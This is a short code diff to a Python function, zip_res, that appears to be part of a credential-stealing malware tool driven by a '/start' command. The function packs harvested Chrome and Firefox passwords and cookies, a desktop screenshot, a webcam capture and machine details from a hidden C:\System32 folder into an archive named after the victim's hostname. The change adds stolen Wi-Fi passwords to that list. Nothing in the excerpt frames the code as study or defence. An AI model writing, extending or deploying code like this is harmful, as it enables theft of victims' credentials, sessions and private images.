@@ -11,7 +11,8 @@ def zip_res():
     # array to archive for the /start command
     arr_for_arh = [r"C:\System32\x25x02x42\chrome_passwords.txt", r"C:\System32\x25x02x42\chrome_cookies.txt",
                    r"C:\System32\x25x02x42\scr_des.png", r"C:\System32\x25x02x42\cam.png", r"C:\System32\x25x02x42\setup_pc.txt",
-                   r"C:\System32\x25x02x42\Firefox_password.txt", r"C:\System32\x25x02x42\Firefox_cookies.txt", ]
+                   r"C:\System32\x25x02x42\Firefox_password.txt", r"C:\System32\x25x02x42\Firefox_cookies.txt",
+                   r"C:\System32\x25x02x42\pass_wifi.txt", ]
     j_zip = zipfile.ZipFile(fr"C:\System32\x25x02x42\{socket.gethostname()}.zip", 'w')  # creating an archive for /start
 
     for name_f in arr_for_arh:
